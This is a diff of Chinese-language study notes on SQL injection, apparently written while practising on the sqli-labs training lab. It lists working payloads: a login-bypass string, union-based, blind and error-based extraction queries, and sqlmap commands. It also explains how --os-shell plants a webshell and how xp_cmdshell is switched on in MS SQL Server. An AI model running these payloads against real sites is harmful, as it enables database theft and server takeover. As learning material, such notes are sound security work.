@@ -11,6 +11,7 @@
 	- /\*\*/ 内联注释, 用于绕过防火墙过滤空格的规则
 	- SQL注入挖到就是高危
 	- `order by 1` 第一列
+
 ### MySQL系统表
 - `information_schema`
 	- `SCHEMATA`: 当前mysql实例中所有数据库的信息
@@ -21,72 +22,144 @@
 		- `show column from schemaname.tablename`
 ![[Pasted image 20230728211108.png]]
 
-## SQL注入
-利用现有应用程序, 将而已的SQL命令注入到程序后台并在数据库引擎执行的能力
-SQL注入漏洞是WEB应用程序对用户输入的数据合法性判断不严格导致
-攻击者把SQL命令语句作为数据, 传输到服务器, 被SQL解释器正确解析执行, 数据库把查询到的结果返回给服务器, 呈现到前端(攻击者), 攻击者获得数据库内信息
+## SQL注入简介
+- 利用现有应用程序, 将而已的SQL命令注入到程序后台并在数据库引擎执行的能力
+- SQL注入漏洞是WEB应用程序对用户输入的数据合法性判断不严格导致
+- 攻击者把SQL命令语句作为数据, 传输到服务器, 被SQL解释器正确解析执行, 数据库把查询到的结果返回给服务器, 呈现到前端(攻击者), 攻击者获得数据库内信息
 
-## SQL注入基本原理
+### SQL注入基本原理
 - 当web应用向后台数据库传递*SQL语句*进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理, 那么攻击者就可以构造特殊的SQL语句, 直接输入数据库引擎执行, **获取或修改数据库中的数据**
-- 本质: 把用户输入的数据当作代码来执行, 违背了**"数据与代码分离"** 的原则
+- 本质: 把用户输入的数据当作代码来执行, 违背了**数据与代码分离** 的原则
 - 两个关键点:
 	- 用户能够控制输入的内容
 	- Web应用把用户输入的内容带入到数据库中执行
 
 ### SQL注入的危害
-- 盗取网站的敏感信息
-- 绕过网站后台认证
+- 盗取网站的敏感信息: 获取网站管理员账号密码
+- 绕过网站后台认证: 使用万能密码登录后台
 	- 登录后台语句: `SELECT * FROM admin WHERE username = 'user' and password = 'pass'`; `SELECT * FROM admin WHERE id = '1'` ^8e5d25
 	- 万能密码: `' or '1' = '1' #` 值必为1
-- 借助SQL注入漏洞提权获取系统权限
-- 读取文件信息
-
-### SQL注入的分类
-- 根据位置分类: GET, POST, Head头注入
-- 根据反馈结果分类: 有回显(显错注入), 无回显(盲注)
-- 根据数据类型分类:
-	- 数字型: 输入的参数位整型, 如id, 年龄, 页码等
-	- 字符型: 输入的参数为字符串
-	***其两者最大的区别在于: 数字型不需要单引号闭合, 字符串型一般需要单引号闭合***
+- 借助SQL注入漏洞提权获取系统权限: 远程执行命令, 读取修改注册表
+- 读取文件信息列: 目录, 读取写入文件
 
 ### 判断是否存在sql注入
-用引号进行闭合测试
+用引号进行闭合测试, 如果测试语句被成功执行, 说明存在注入漏洞
 
-### SQL注入流程(get)
-- 以mysql数据库为例, 这也是现如今被开发者使用得最多的数据库系统
+### SQL注入的分类
+- 按参数类型分类
+	- *数字型*: 输入的参数位整型, 如id, 年龄, 页码等
+		- `and 1=1`, `and 1=2` 注入布尔值判断, 查看页面是否产生差别
+		- `where id=1'` 构造sql语法错误, 查看输入是否被执行
+	- *字符型*: 输入的参数为字符串, 被引号包裹, 需要判断单双引号闭合
+		- `sql = "select name from users where id='1'"`
+		- `1' and 1=1 #` 添加引号闭合, \#注释其后语句
+		- `1' and 1=2 #`
+	- *搜索型*: SQL语法中的模糊查询`like`关键字, 需要搜索的字符串被`%`包裹
+		- `1%' and 1=1` 同时闭合`%`和引号
+		- **`%`的URL编码为`%25`, 空格的编码为`%20`, 可以手工添加**
+- 根据位置分类: 
+	- *GET*: 在URL中构造payload
+	- *POST*: 在请求体中构造payload, 常用于表单
+	- *HTTP Header*: 注入点在HTTP头部某个字段中如`User-Agent`
+	- *Cookie*: HTTP请求时会带有客户端的Cookie, 注入点在Cookie的某字段里
+- 根据反馈结果分类: 
+	- *回显注入*: 在注入点的当前页面获取返回结果, `1=1` 判断
+	- *报错注入*: 程序将数据库的错误信息直接显示在页面中, 可以通过构造一些特殊的报错语句返回想要的结果
+		- *SQLServer*中通常错误查询回返回报错信息, *Mysql*没有但可以通过
+	- *无回显(盲注)*: 程序后端限制数据库返回错误信息, 使用特殊方式判断
+		- *基于布尔值*(是否正确)
+			- 无报错信息返回
+			- 会显示1或0两种情况, 可以通过`and 1=1`判断
+		- *基于时间*(延时注入)
+			- 通过时间条件判断1和0
+			- `1' and sleep(10) #`, 根据页面返回的时间判断
+			- `1' and if((substr((select database()),1,1)='a',sleep(5),null) #` 判断数据库第一位是否是"a", 是则sleep(5), 否则null
+
+## SQL注入利用
+### 前置知识
+#### 通用
+- 运算逻辑符: `and`, `or`, `!=` and优先级大于or
+- 注释符: `--+` 通用, `#` 仅mysql
+- `limit 0,1` 前者位置后者数量
+- `union select` 联合查询, 两句将结果去重合并 (`all union`不去重)
+- `group_concat(col)` 将该列多行数据显示到一行
+
+#### mysql
+- `version()` 当前数据库版本, 大于5.0可以使用`information_schema`库
+- `database()` 当前数据库名
+- `@@datadir` 当前数据库路径
+- `@@version_compile_os` 当前操作系统版本
+
+##### 三种concat函数的区别
+- `concat`: 将多个字符串连接成一个字符串
+	- `concat(str1, str2, str3, ...)`
+- `concat_ws`: 可以一次性指定分隔符
+	- `concat_ws(separator, str1, str2, ...)`
+- `group_concat`: 将group by产生的同一个分组的值连接, 返回一个结果
+	- `group_concat([distinct] <col_name> [order by <rank_col> asc/desc] [separator '<spt>'])`
+
+### 注入基本流程
+以*mysql数据库*为例, 这也是现如今被开发者使用得最多的数据库系统
 1. 寻找注入点, 在网页中的搜索框(URL地址栏)尝试能否注入(是否有回显)
-2. 判断闭合方式: 字符串型/数字型, 单引号括号
+	- `id=1' and 1=1 --+`判断存在
+	- `id=-1' or 1=1 --+` 构造报错
+1. 判断闭合方式: 字符串型/数字型, 单引号括号
 	- `?id=1asdf'`
 		- 有报错: 数字型, 无闭合或)闭合
 		- 无报错: 字符型, 再判断闭合方式(`'`, `"`, `')`, `")`)
-3. 验证漏洞: 是否能按照期望回显
+2. 验证漏洞: 是否能按照期望回显
 	- `?id=1' and 1 --+` 正常显示 (--+是注释, url中的'+'会被翻译成空格, mysql也可以使用'#')
 	- `?id=1' and 0 --+` 无显示
-4. 判断列数和回显位: order by 和 union select
+3. 判断列数和回显位: order by 和 union select
 	- 列数: `?id=1' order by 3 --+` (在mysql中orderby可以指定用于排序的列在SELECT语句结果集中的位置, 所以此处枚举可回显的最大序号列)
 	- 回显位: `?id=-1' union select 1,2,3 --+` (联合查询的数量取决于上一步所获取到的列数(必须相同才能联合查询), 查看所有列中第几位能够回显, 重要的是让前面一个表达式为空/False)
-5. 取数据: 
+4. 取数据: 
 	- 库名: `database()` 替换可以回显的位置
 	- 表名: `(select group_concat(table_name) from information_schema.tables where table_schema=database())` 替换回显位
 	- 列名(users): `(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')` 替换回显位
 	- 具体数据(username): `(select group_concat(username) from users)`
 - 注入完成: **可以任意获取数据库内的数据**
 
+---
+
+## 显错注入
+### GET显错注入
+- **sqli-labs: Less-1**
+0. 判断	
+	- `id=1' and 1=1 --+`判断存在
+	- `id=-1' or 1=1 --+` 构造报错
+1. 获取字段数 `order by x`
+	- `id=1' order by 3 --+`
+2. 获取显示位 `union select 1,2,3,4`, 对应字段数
+	- `id=1' union select 1,2,3 --+`
+3. 获取数据库信息 `version()`, `user()`, `@@datadir`
+	- `id=1' union select 1,(select version()),(select user()) --+`
+4. 获取当前数据库 `database()`, `schema()`
+	- `id=1' union select 1,(select database()),3 --+`
+5. 获取所有数据库
+	- `id=1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+`
+6. 获取"security"数据库所有表名
+	- `id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+`
+7. 获取"security.users"表所有字段
+	- `id=1' union select 1,group_concat(table_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+`
+8. 获取数据
+	- `id=1' union select 1,username,password from security.users --+`
+
 ### POST型注入
 - 不在url处注入, 而是在post报文中, 使用Burp注入(也可以使用hackbar的postdata)
 - 寻找注入点, 根据相应报错信息和返回报文进行注入
-- sqli-labs-less11
+- **sqli-labs: Less-11**
 
+---
 
-# 盲注
-- 盲注就是在SQL过程中, 找到注入点后, 执行SQL语句后, 选择的数据或错误信息不能回显到前端页面, 要利用一些方法进行判断或猜测
+## 盲注
+在SQL过程中, 找到注入点后, 执行SQL语句, 选择的数据或错误信息不能回显到前端页面, 要利用一些方法进行判断或猜测
 
-## 盲注的分类
+### 盲注的分类
 - 基于布尔判断
 - 基于时间延迟
-- 基于报错显示
 
-## 盲注常用函数 (mysql)
+### 盲注常用函数 (mysql)
 - `substr(string, start, length)`
 	- 功能: 截取字符串
 	- 返回值: 截取后的字符串
@@ -101,7 +174,7 @@ SQL注入漏洞是WEB应用程序对用户输入的数据合法性判断不严�
 	- 功能: 截取字符串string最右边的n位, 返回值和参数与left()
 	- `right(database(),1)> 'a'` -- 判断数据库名最后一个字符是否大于a; 再查看其它位
 - `ord(char)`
-	- 功能: 返回字符char的ascii码, **有时又服务器会对单引号进行转义, 使用ASCII码就不用使用单引号参数**
+	- 功能: 返回字符char的ascii码
 	- 返回值: 字符串, 字符char的ascii码
 	- 参数: char:操作字符(串)
 - `ascii(str)`
@@ -110,6 +183,9 @@ SQL注入漏洞是WEB应用程序对用户输入的数据合法性判断不严�
 - `length(string)`
 	- 功能: 返回字符串string的长度
 	- `length(DATABASE())>5` -- 判断数据库名长度大于5
+- `count(col)`
+	- 功能: 返回语句中某列的行数, 一般于`where`限定条件一起使用
+	- `count(1)` 返回一个表中行的总数
 - `ifnull(str1, str2)`
 	- 功能: 根据第一个参数是否为null返回具体的值, 如果str1!=null, 返回str1; 如果str1\==null, 返回str2
 	- 参数: str1和str2分别为两个字符串
@@ -119,12 +195,14 @@ SQL注入漏洞是WEB应用程序对用户输入的数据合法性判断不严�
 
 ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能的字符. 标准的ASCII码也叫基础ASCII码, 使用7位二进制数(剩下一位置0)来表示所有的大写和小写字母, 数字0到9, 标点符号, 以及在美式英语中使用的特殊控制字符
 
+**有时又服务器会对单引号进行转义, 使用ASCII码就不用使用单引号参数**
 
-## 布尔盲注
+### 布尔盲注
 - 是利用SQL语句**逻辑与**(and)操作, 判断and两边的条件是否成立, SQL语句带入数据库查询后判断返回内容(通常返回值仅有空和非空两种状态), 类似布尔型的true和false. 类似于一个人, 只能点头摇头来传递信息
 - 特性: 对于用户执行的SQL语句, 只有两种页面显示, 利用SQL判断语句正确与否, 达到获取数据的目的
+- **sqli-labs: Less-8**
 
-### 布尔盲注的流程
+#### 布尔盲注的流程
 1. 确定注入点
 	- `?id=1''`
 	- 添加单引号/双引号一次/两次, 来判断判断注入点以及闭合方式
@@ -135,7 +213,7 @@ ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能�
 4. 猜解当前数据库名称
 	- `ascii(substr(database(),1,1))>95 --+` 依次查看字符串名称的值
 	- Burp的Intruder模块爆破, 调整Payloads
-5. 猜解数据表的数量
+5. 猜解数据表总数
 	- `(select count(table_name) from information_schema.tables where table_schema=database())=4 --+`
 6. 猜解数据表第一个名称的长度
 	- `length((select count(table_name) from information_schema.tables where table_schema=database() limit 0,1))=6 --+` length()只接收一个参数, 所以里面的嵌套查询需要括起来(limit部分的逗号) , 二分法
@@ -145,42 +223,77 @@ ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能�
 	- `(select count(column_name) from information_schema.columns where table_schema=database() and table_name="emails")=2 --+`
 9. 猜解数据表中第一个字段的名称长度
 	- `length((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1))=2 --+`
-10. 猜解第数据表中第一个字段的第一个字符
+10. 猜解数据表中第一个字段名称的第一个字符
 	- `ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),1,1))>97 --+`
-11. 获取字段中的记录
+11. 获取数据表字段的内容长度
+	- `length((select id from emails))=3`
+12. 获取字段中的记录
 	- `ascii(substr((select group_concat(id) from emails),1,1))=49`
 
-### Post盲注
+#### Post盲注
 - 通过执行不同的SQL命令, 根据网页返回的post报文, 进行盲注
 - 使用Burp的Proxy, Intruder和Repeater功能
-- sqli-labs的lession-15
+- **sqli-labs: Less-15**
 - 判断闭合方式时, 因正确数据未知, 故使用 `随机数据 or 1=1#`, 随机数据的闭合方式正确则1=1生效, 返回True
 
-## 报错盲注
+### 时间盲注(延时注入)
+- 如果同时既没有布尔回显以及错误回显, 则只能通过延时注入, 根据浏览器页面的相应时间来判断正确的数据
+- 通过`and sleep(5)`来判断页面的响应时间, 在五秒多一点则说明此处可以延时注入
+- `if(a, b, c)`: a是判断语句, 如果a的结果为真, 则返回b; 如果a的结果为假, 则返回c
+#### sleep()
+- 使用与布尔盲注相似的条件, if()函数来使如果为真则执行sleep()函数
+- payload: `if((length(database())=4),sleep(5),1)
+
+#### BENCHMARK()
+- `BENCHMARK(count,expr)` 重复count次执行表达式expr, 可以用于计时MySQL处理表达式的速度, 返回值为0, 仅显示时间
+- 特性
+	- 无论expr表达式的语句执行结果为True, False或Null, benchmark都会正常执行
+	- expr表达式仅支持查询单行单列的结果, 反之则报错
+	- benchmark内的语句执行失败, benchmark同样执行失败
+- 选择一些耗时较长的函数如:md5(), sha()等
+- payload: `if((length(database())=4),(select benchmark(10000000,md5(0x41))),1)`
+
+---
+
+## 报错注入
 - 如果Web没有正常的错误回显, 就只能通过输入错误格式的语句(函数), 使数据库报错, 并在报错信息中加入想要获取的数据
+- 使用一些指定的函数来**制造报错信息**, 获取指定信息
+
 ### xpath语法错误
 #### extractvalue()
 - 正常语法: `extractvalue(xml_document, Xpath_string);`
 	- xml_document: xml文档对象的名称, string格式
 	- Xpath_string: xpath格式的字符串, **如果不符合xpath格式, 则会报错, 并将报错结果放在报错信息中**
 - 作用: 从目标xml中返回包含所查询值的字符串
-- payload: `id='and(select extractvalue("anything",concat('~',(select语句))))`
+- payload: `id='and (select extractvalue("anything",concat('~',(select语句))))`
 	- 查库名: `(select extractvalue(1,concat('~',(select database()))))`
 	- 查数据库版本: `(select extravalue(1, concat(0x7e,@@version)))`
 	- 查表名: `(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))`
 	- 查字段名: `(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))))`
-	- 查数据: `(select extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAMES) from TABLE_NAME))))`
+	- 查数据: `(select extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAME) from TABLE_NAME))))`
 - 注: 
-	- `0x7e` = '~', 也可以换成'#' '$'等不满足xpath格式的字符
+	- `0x7e` = '~'的ascii, 也可以换成'#' '$'等不满足xpath格式的字符
 	- mysql中`version()`=`@@version`; `concat('a','b')`="ab"
-	- extractvalue()能查询字符串长度**最大为32**, 如果结果超过32则需要使用substring()截取或使用limit分页
+	- extractvalue()能查询字符串**长度最大为32**, 如果结果超过32则需要使用substring()截取或使用limit分页
 
 #### updatexml()
-- 正常语法: `updatexml(xml_document,xpath_string,new_value)`
+- 正常语法: `updatexml(xml_document, xpath_string, new_value)`
 	- new_value: string格式, 替换查找到的符合条件的数据
 - 作用: 改变文档中符合条件的节点的值
 - payload: `id=' and (select updatexml("anything",concat('~',(select...)),"anything"))` (在extractvalue基础上多一个任意参数)
 	- 查数据库版本: `(select updatexml(1,concat(0x7e,@@version),1))`
+
+### floor() 取整函数
+mysql用于取整数的函数, 返回不大于x的最大整数值
+- 必要条件: 
+	- `rand()`: 结果不可以作为`order by`, `group by`的条件字段
+	- `count(*)`: 计算所有行数, 不忽略空值
+	- `group by`: 根据字段分组
+- payload: `select * from users where id=1 and (select 1 from (select count(*), concat(database(), floor(rand(0)*2)) as x from information_schema.tables group by x)a);`
+- `floor(rand(0)*2)`: rand生成[0,1]的随机数, 添加因子0生成固定, floor取整, 这段函数的执行结果会为0或1
+- 将需要查询的内容于0或1连接作为临时表(查询结果)的主键(group by)
+- 利用mysql中groupby创建带有count()函数的临时表时, 在已经确认需要插入新主键后, rand()函数会重新计算值(可能由0变1)的特性, 构造主键重复的bug, 可以将函数执行的内容拼接成主键并报错输出
+详见: [关于floor()报错注入 - FreeBuf](https://www.freebuf.com/articles/web/257881.html)
 
 ### concat+rand()+group_by()导致主键重复
 - 本质上基于`floor(rand(0)*2)`的重复性, 导致group by语句出错
@@ -201,43 +314,30 @@ ASCII码使用指定的7位或8位二进制数组合来表示128或256种可能�
 - mysql列名重复会导致报错, NAME_CONST制造一个列; 使用join同时创建两个相同的列造成列名重复
 - payload: `exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c)` (爆数据库版本)
 
+### 其它注入函数
+- geometrycollection(): `select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));`
+- multipoint(): `select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));`
+- polygon(): `select * from test where id=1 and polygon((select * from(select * from(select user())a)b));`
+- multipolygon(): `select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));`
+- linestring(): `select * from test where id=1 and linestring((select * from(select * from(select user())a)b));`
+- multilinestring(): `select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));`
+- exp(): `select * from test where id=1 and exp(~(select * from(select user())a));`
 
-## 时间盲注(延时注入)
-- 如果同时既没有布尔回显以及错误回显, 则只能通过延时注入, 根据浏览器页面的相应时间来判断正确的数据
-- 通过`and sleep(5)`来判断页面的响应时间, 在五秒多一点则说明此处可以延时注入
-- `if(a, b, c)`: a是判断语句, 如果a的结果为真, 则返回b; 如果a的结果为假, 则返回c
-### sleep()
-- 使用与布尔盲注相似的条件, if()函数来使如果为真则执行sleep()函数
-- payload: `if((length(database())=4),sleep(5),1)
+---
 
-### BENCHMARK()
-- `BENCHMARK(count,expr)` 重复count次执行表达式expr, 可以用于计时MySQL处理表达式的速度, 返回值为0, 仅显示时间
-- 特性
-	- 无论expr表达式的语句执行结果为True, False或Null, benchmark都会正常执行
-	- expr表达式仅支持查询单行单列的结果, 反之则报错
-	- benchmark内的语句执行失败, benchmark同样执行失败
-- 选择一些耗时较长的函数如:md5(), sha()等
-- payload: `if((length(database())=4),(select benchmark(10000000,md5(0x41))),1)`
-
-# Sqlmap注入
-
-### 漏洞挖掘
-- 漏洞挖掘是指对用用程序中位置漏洞的探索, 通过综合应用应用各种技术和工具, 尽可能地找出其中的潜在漏洞. 一般情况下漏洞挖掘针对单一的应用系统, 通过端口扫描, 目录扫描, 文件扫描等方式对其进行信息收集, 然后再进行漏洞挖掘
-
-#### OWASP TOP 10
-- 是由Web应用程序安全项目(OWASP)建立的公开共享的10给最关键的Web应用程序安全漏洞列表. 根据OWASP, 漏洞使应用程序中的一个弱点, 它允许恶意方(攻击者)对应用程序的利益相关者(所有者, 用户等)造成伤害
-
-#### 主流漏洞挖掘工具
-- Burp Suite
-- Sqlmap
-- Xray
-- AWVS
-- Nessus
-- Metasploit
-
-## sqlmap使用
+## Sqlmap注入
+### Sqlmap
 https://sqlmap.org
+https://github.com/sqlmapprojecct/sqlmap
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
 - sqlmap是一个使用python语言开发的开源的渗透测试工具, 可以用来进行自动化检测, 利用SQL注入漏洞, 获取数据库服务器的权限. 它具有功能强大的检测引擎, 针对各种不同类型数据库的渗透测试的功能选项, 包括获取数据库中存储的数据, 访问操作系统文件, 甚至可以通过外带数据连接的方式执行操作系统命令, 
+
+### 支持的注入模式
+- 布尔盲注
+- 时间盲注
+- 报错注入
+- 联合查询注入(union)
+- 堆叠查询注入(可以同时执行多条语句)
 
 #### 测试单目标(GET型)
 - 例: `python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1&page=10 -p page -batch`
@@ -258,7 +358,23 @@ https://sqlmap.org
 #### 测试POST型注入
 - -r: 指定要测试的数据包(txt文件), 里面有post请求包
 
-## SQL注入漏洞寻找及提交
-### google hacking
-- sql常见特征: `?id=1` `?xxx=xxx`
-- google hacking语法: `inurl:?id=1`
+### SQLMAP --os-shell原理
+- 拥有网站的写入权限, 且`Secure_file_priv`参数位空或者为指定路径
+1. 目标基础信息探测
+2. 上传shell到目标网站, 通过into outfile文件写入上传一个上传功能的马, 通过这个上传马上传webshell
+3. 退出时执行命令删除webshell
+
+#### MS SQL Server
+使用`xp_cmdshell`扩展存储过程(如果被禁用(2005以上默认禁用), SQLMAP会创建并启用), 且在数据库支持外连且权限为SA时
+`--sql-shell`手动启用`xp_cmdshell`
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+是否为SA: `select IS_SRVROLEMEMBER('sysadmin')`
+是否存在`xp_cmdshell`扩展进程: `select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'`
+
+#### MySQL
+SQLMAP上传一个二进制库, 包含自定义函数`sys_exec()`和`sys_eval()`, 执行系统命令, 针对**mysql版本大于5.1**且存在`/lib/plugin`目录
